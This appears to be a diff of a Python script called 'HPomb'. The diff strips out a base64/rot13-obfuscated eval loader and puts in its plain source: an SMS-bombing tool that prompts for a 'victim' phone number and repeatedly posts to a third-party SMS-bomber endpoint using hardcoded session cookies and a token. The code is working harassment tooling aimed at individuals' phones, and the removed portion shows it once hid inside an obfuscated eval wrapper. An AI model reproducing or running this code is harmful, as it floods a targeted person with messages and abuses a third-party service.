@@ -1,11 +1,158 @@
-# Python code obfuscated by www.development-tools.net 
- 
+# colors values 
+Red = '\033[1;31m'
+Blue= '\033[1;36m'
+Endc = '\033[0m'
+line = '--------------------------------------------'
+import requests
+import sys
+import os
 
-import base64, codecs
-magic = 'IyBjb2xvcnMgdmFsdWVzIApSZWQgPSAnXDAzM1sxOzMxbScKQmx1ZT0gJ1wwMzNbMTszNm0nCkVuZGMgPSAnXDAzM1swbScKCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgc3lzCmltcG9ydCBvcwoKZGVmIGNscigpOgogICAgdHJ5OgogICAgICAgIGlmIG9zLm5hbWUgPT0gIm50IjoKICAgICAgICAgICAgb3Muc3lzdGVtKCdjbHMnKQogICAgICAgIGVsc2UgOgogICAgICAgICAgICBvcy5zeXN0ZW0oJ2NsZWFyJykKICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoQmx1ZStsaW5lLCdcbicpCiAgICAgICAgICAgIHByaW50KCdcblx0U29tZXRoaW5nIFdyb25nIHRvIENsZWFyIC4uXG5cbiAgICAgICBQbGVhc2UgQ29udGFjdCBUbyBEZXZlbG9wZXIgJykKICAgICAgICAgICAgcHJpbnQoJ1xuXHQgICAgIEVycm9yIDogNTAwXG4nKQogICAgICAgICAgICBwcmludChsaW5lKQogICAgICAgICAgICBwcmludChSZWQrJ1xuXHRcdFsgU3ViIE1lbnUgXScpCiAgICAgICAgICAgIHByaW50KEJsdWUgKycnJ1xuWzAxXSBDb250YWN0IFRvIERldmVsb3BlclxuWzAyXSBBZ2FpbiBSdW4gSFBvbWIgVG9vbCcnJykKICAgICAgICAgICAgZXJyb3I1MDAgPSBpbnB1dCgnXG5DaG9vc2UgT25lIE9wdGlvbnMgOiAnKQogICAgICAgICAgICBpZiBlcnJvcjUwMCA9PSAxOgogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5jYWxsKFtzeXMuZXhlY3V0YWJsZSwgJ2NvcmUvY29udGFjdC5weSddKQogICAgICAgICAgICBlbHNlOiAKICAgICAgICAgICAgICAgIHN1YnByb2Nlc3MuY2FsbChbc3lzLmV4ZWN1dGFibGUsICdocG9tYi5weSddKQogICAgICAgICAgICAKCgpkZWYgYmFubmVyKCk6CiAgICBjbHIoKQogICAgdmVybCA9IG9wZW4oImNvcmUvLnZlcnNpb24iLCJyIikucmVhZCgpCiAgICBnbG9iYWwgZGF0YQogICAgdXNlcmlkID0gIiIKICAgIHVzZV90aW1lID0gIiIKICAgIHVzZXJkID0gMAogICAgaWYgdXNlcmQgPT0gJzAnIDoKICAgICAgICB1c2VyZGlmZiA9ICJOb3JtYWwiCiAgICBlbGlmIHVzZXJkID09ICcxJyA6CiAgICAgICAgdXNlcmRpZmYgPSAiU2lsdmVyIgogICAgZWxpZiB1c2VyZCA9PSAnMicgOgogICAgICAgIHVzZXJkaWZmID0gIkdvbGRlbiIKICAgIGVsc2UgOgogICAgICAgIHVzZXJkaWZmID0gIk5vcm1hbCIKICAgIAogICAgbG9nbz0iIiIKIOKWiOKWiOKWkSDilojiloggIOKWiOKWiOKWk+KWiOKWiOKWiCAgIOKWkuKWiOKWiOKWiOKWiOKWiCAgIOKWiOKWiOKWiOKWhCDiloTilojilojilojilpMg4paE4paE4paE4paEICAgCuKWk+KWiOKWiOKWkSDilojilojilpLilpPilojilojilpEgIOKWiOKWiOKWkuKWkuKWiOKWiOKWkiAg4paI4paI4paS4paT4paI4paI4paS4paA4paI4paAIOKWiOKWiOKWkuKWk+KWiOKWiOKWiOKWiOKWiOKWhCAK4paS4paI4paI4paA4paA4paI4paI4paR4paT4paI4paI4paRIOKWiOKWiOKWk+KWkuKWkuKWiOKWiOKWkSAg4paI4paI4paS4paT4paI4paIICAgIOKWk+KWiOKWiOKWkeKWkuKWiOKWiOKWkiDiloTilojilogK4paR4paT4paIIOKWkeKWiOKWiCDilpLilojilojiloTilojilpPilpIg4paS4paS4paI4paIICAg4paI4paI4paR4paS4paI4paIICAgIOKWkuKWiOKWiCDilpLilojilojilpHilojiloAgIArilpHilpPilojilpLilpHilojilojilpPilpLilojilojilpIg4paRICDilpHilpEg4paI4paI4paI4paI4paT4paS4paR4paS4paI4paI4paSICAg4paR4paI4paI4paS4paR4paT4paIICDiloDilojilpMKIOKWkiDilpHilpHilpLilpHilpLilpLilpPil'
-love = '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'
-god = 'VzdF9udW1iZXIgPSBpbnB1dCgiXG5QbGVhc2UgRW50ZXIgTnVtYmVyIG9mIE1hc3NhZ2UgOiAiKQoKCmRlZiBtYXNzYWdlMSgpOgogICAgZ2xvYmFsIG1vYmlsZV9udW1iZXIKICAgIGdsb2JhbCBjb3VudHJ5X2NvZGUKICAgIGZvciBpIGluIHJhbmdlKDEsMjAxKToKICAgICAgICBiYW5uZXIoKQogICAgICAgIHVybCA9ICJodHRwczovL215dG9vbHN0b3duLmNvbS9zbXNib21iZXIvc2VuZC9zZW5kc21zLnBocCIKCiAgICAgICAgaGVhZGVyID0gewogICAgICAgICdIb3N0JzogJ215dG9vbHN0b3duLmNvbScsCiAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0OyBydjo3OC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94Lzc4LjAnLAogICAgICAgICdBY2NlcHQnOiAnYXBwbGljYXRpb24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMScsCiAgICAgICAgJ0FjY2VwdC1MYW5ndWFnZSc6ICdlbi1VUyxlbjtxPTAuNScsCiAgICAgICAgJ0FjY2VwdC1FbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlJywKICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZDsgY2hhcnNldD1VVEYtOCcsCiAgICAgICAgJ1gtUmVxdWVzdGVkLVdpdGgnOiAnWE1MSHR0cFJlcXVlc3QnLAogICAgICAgICdDb250ZW50LUxlbmd0aCc6JzExMCcsCiAgICAgICAgJ09yaWdpbic6ICdodHRwczovL215dG9vbHN0b3duLmNvbScsCiAgICAgICAgJ0Nvbm5lY3Rpb24nOidjbG9zZScsCiAgICAgICAgJ1JlZmVyZXInOiAnaHR0cHM6Ly9teXRvb2xzdG93bi5jb20vc21zYm9tYmVyLycKICAgICAgICB9CgogICAgICAgIENvb2tpZT17CiAgICAgICAgICAgICdfX2NmZHVpZCcgOiAnZDAwNmMwNTFiOGQwYWM1NmUzZmU4NzI5NzkxMWY5N2QxMTYwNTg4MDg3NycsCiAgICAgICAgICAgICdQSFBTRVNTSUQnOicyNmZlYmU1ZWRjYjlmMTlhNDRkNjY0YjcwYzcyMTVmOCcsCiAgICAgICAgICAgICdfeWV0aV9jdXJyZW5jeV9uZXdfMyc6ICd7ImRhdGFBc09mIjoiMjAyMC0xMS0xOVQxMDowMDo0NS45MTFaIiwiY29udmVyc2lvbnMiOnsiVVNEIjp7IkNBRCI6MS4zMDcyMTI2NzI3LCJIS0QiOjcuNzUyMzU5Mjg1NSwiSVNLIjoxMzYuMDgwMjE1NzA2MSwiUEhQIjo0OC4yNTMyODYxNDc2LCJES0siOjYuMjc4NzMyNzI2NywiSFVGIjozMDMuNTQ3MzU0MjI5OSwiQ1pLIjoyMi4yNDU1MzQyMDk2LCJHQlAiOjAuNzUzMDU4NjQ1MSwiUk9OIjo0LjEwNTk5OTMyNTksIlNFSyI6OC42MDU5MTUwNjU3LCJJRFIiOjE0MTEwLjk5NTk1NTUxMDYsIklOUiI6NzQuMTU4MjQwNjQ3MSwiQlJMIjo1LjMwNjIwMTU1MDQsIlJVQiI6NzUuODg1NTc0NjU0NSwiSFJLIjo2LjM3NTk2ODk5MjIsIkpQWSI6MTAzLjg3NTk2ODk5MjIsIlRIQiI6MzAuMzIwMTg4NzQyOCwiQ0hGIjowLjkxMTAyMTIzMzYsIkVVUiI6MC44NDI2MDE5NTQ4LCJNWVIiOjQuMDg3NDYyMDgyOSwiQkdOIjoxLjY0Nzk2MDkwMzMsIlRSWSI6Ny43MTQ4NjM0OTg1LCJDTlkiOjYuNTU3MTI4NDEyNSwiTk9LIjo5LjAyNTUzMDgzOTIsIk5aRCI6MS40NDQ2NDEwNTE2LCJaQVIiOjE1LjQwMzk0MzM3NzEsIlVTRCI6MSwiTVhOIjoyMC4yMzEyOTQyMzY2LCJTR0QiOjEuMzQxMTY5NTMxNSwiQVVEIjoxLjM2NzIwNTkzMTksIklMUyI6My4zNDg2Njg2ODg5LCJLUlciOjExMDQuMjcxOTkxOTExLCJQTE4iOjMuNzY1OTI1MTc2OX0sIkdCUCI6eyJDQUQiOjEuNzM1ODcxMDEyNSwiSEtEIjoxMC4yOTQ0OTYxMDA2LCJ'
-destiny = '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'
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+def clr():
+    try:
+        if os.name == "nt":
+            os.system('cls')
+        else :
+            os.system('clear')
+    except:
+            print(Blue+line,'\n')
+            print('\n\tSomething Wrong to Clear ..\n\n       Please Contact To Developer ')
+            print('\n\t     Error : 500\n')
+            print(line)
+            print(Red+'\n\t\t[ Sub Menu ]')
+            print(Blue +'''\n[01] Contact To Developer\n[02] Again Run HPomb Tool''')
+            error500 = input('\nChoose One Options : ')
+            if error500 == 1:
+                subprocess.call([sys.executable, 'core/contact.py'])
+            else: 
+                subprocess.call([sys.executable, 'hpomb.py'])
+            
+
+
+def banner():
+    clr()
+    verl = open("core/.version","r").read()
+    global data
+    userid = ""
+    use_time = ""
+    userd = 0
+    if userd == '0' :
+        userdiff = "Normal"
+    elif userd == '1' :
+        userdiff = "Silver"
+    elif userd == '2' :
+        userdiff = "Golden"
+    else :
+        userdiff = "Normal"
+    
+    logo="""
+ ██░ ██  ██▓███   ▒█████   ███▄ ▄███▓ ▄▄▄▄   
+▓██░ ██▒▓██░  ██▒▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ 
+▒██▀▀██░▓██░ ██▓▒▒██░  ██▒▓██    ▓██░▒██▒ ▄██
+░▓█ ░██ ▒██▄█▓▒ ▒▒██   ██░▒██    ▒██ ▒██░█▀  
+░▓█▒░██▓▒██▒ ░  ░░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓
+ ▒ ░░▒░▒▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒
+ ▒ ░▒░ ░░▒ ░       ░ ▒ ▒░ ░  ░      ░▒░▒   ░ 
+ ░  ░░ ░░░       ░ ░ ░ ▒  ░      ░    ░    ░ 
+ ░  ░  ░             ░ ░         ░    ░      
+                                           ░ 
+               ""","""
+----------------     ----------------------
+|   Secanon    |     | Version : """,verl,""" |
+----------------     ----------------------
+
+\tCreated by Honey Pots...
+
+-------------------------------------------- 
+ ID : """,userid,"""    USE : """,use_time,"""    USER : """,userdiff,"""        
+-------------------------------------------- \n"""
+    print(Red+logo[0]+Blue+logo[1]+logo[2]+logo[3]+logo[4]+logo[5]+logo[6]+logo[7]+logo[8]+logo[9])
+
+banner()
+
+country_code = input("Please Enter Country Code [ Default : +91 ] : ")
+country_code = country_code.strip()
+while int(len(country_code)) > 4 :
+    print("\n--Sorry Invalid Input Country Code Only 3 digit--")
+    country_code = input("\nPlease Re-enter Country Code [ Default : +91 ] : ")
+    country_code = country_code.strip()
+
+country_code_plus = country_code.find("+")
+
+while country_code_plus >= 0 :
+    country_code =  country_code.replace("+", "")
+    country_code_plus = country_code.find("+")
+
+if country_code == '' :
+    country_code = "91"
+
+mobile_number = input("\nPlease Enter Victim Mobile Number  : ")
+
+while len(mobile_number) > 11 or len(mobile_number) <= 8 :
+    mobile_number = input("\nInvalid Input ! Please Re-enter Mobile Number : ")    
+
+request_number = input("\nPlease Enter Number of Massage : ")
+
+while request_number.isdigit() != True :
+    print("\n--Invalid Input ! Number Of Massage Enter In Digit--")
+    request_number = input("\nPlease Enter Number of Massage : ")
+
+
+def massage1():
+    global mobile_number
+    global country_code
+    for i in range(1,201):
+        banner()
+        url = "https://mytoolstown.com/smsbomber/send/sendsms.php"
+
+        header = {
+        'Host': 'mytoolstown.com',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Accept-Language': 'en-US,en;q=0.5',
+        'Accept-Encoding': 'gzip, deflate',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Content-Length':'110',
+        'Origin': 'https://mytoolstown.com',
+        'Connection':'close',
+        'Referer': 'https://mytoolstown.com/smsbomber/'
+        }
+
+        Cookie={
+            '__cfduid' : 'd006c051b8d0ac56e3fe87297911f97d11605880877',
+            'PHPSESSID':'26febe5edcb9f19a44d664b70c7215f8',
+            '_yeti_currency_new_3': '{"dataAsOf":"2020-11-19T10:00:45.911Z","conversions":{"USD":{"CAD":1.3072126727,"HKD":7.7523592855,"ISK":136.0802157061,"PHP":48.2532861476,"DKK":6.2787327267,"HUF":303.5473542299,"CZK":22.2455342096,"GBP":0.7530586451,"RON":4.1059993259,"SEK":8.6059150657,"IDR":14110.9959555106,"INR":74.1582406471,"BRL":5.3062015504,"RUB":75.8855746545,"HRK":6.3759689922,"JPY":103.8759689922,"THB":30.3201887428,"CHF":0.9110212336,"EUR":0.8426019548,"MYR":4.0874620829,"BGN":1.6479609033,"TRY":7.7148634985,"CNY":6.5571284125,"NOK":9.0255308392,"NZD":1.4446410516,"ZAR":15.4039433771,"USD":1,"MXN":20.2312942366,"SGD":1.3411695315,"AUD":1.3672059319,"ILS":3.3486686889,"KRW":1104.271991911,"PLN":3.7659251769},"GBP":{"CAD":1.7358710125,"HKD":10.2944961006,"ISK":180.7033444105,"PHP":64.0763989124,"DKK":8.337641122,"HUF":403.0859431819,"CZK":29.5402414599,"GBP":1,"RON":5.4524297047,"SEK":11.427948038,"IDR":18738.2430935517,"INR":98.4760498137,"BRL":7.0461996352,"RUB":100.7698074363,"HRK":8.4667628926,"JPY":137.9387510769,"THB":40.2627191657,"CHF":1.2097613373,"EUR":1.1189061573,"MYR":5.4278137693,"BGN":2.1883566625,"TRY":10.2447047766,"CNY":8.7073277164,"NOK":11.9851633044,"NZD":1.9183646068,"ZAR":20.4551710248,"USD":1.3279178275,"MXN":26.8654962908,"SGD":1.7809629306,"AUD":1.8155371309,"ILS":4.4467568505,"KRW":1466.3824645027,"PLN":5.0008391796}}}',
+            '_ga': 'GA1.2.1536213637.1605852084',
+            '_gid':'GA1.2.1125062803.1605852084',
+            '__gads':'ID=65893a701e5da73c:T=1605880884:S=ALNI_MYD8hdq-BdDE_UXiZ9XYAsFQ6hbkA'
+        }
+    
+        data = {
+        'sendsms' : 'true',
+        'mobno':mobile_number,
+        'count':'200',
+        'update':'0',
+        'token':'f3995d09f9dad5cd46254cdbca0e7945',
+        'countrycode':country_code,
+        'smsno': i 
+        }
+        
+        request = requests.post(url=url , data=data , headers=header,cookies=Cookie)
+        output = request.json
+        print(Blue)
+        print("-------------------------------------------- ")
+        print(Red +"                  Details "+Blue)
+        print("   Target Number           : +" + str(country_code)+" ", mobile_number)
+        print("   Number of Requests Sent : ", i)
+        print("   Successful Requests     : ", i)
+        print("   Failed Requests         : ", '0')
+        print("-------------------------------------------- ")
+        print("            Bombing In Progress")
+        input()
+def massage2():
+    pass
+
+for i in range(4):
+    banner()
+    massage1()
+    massage2()
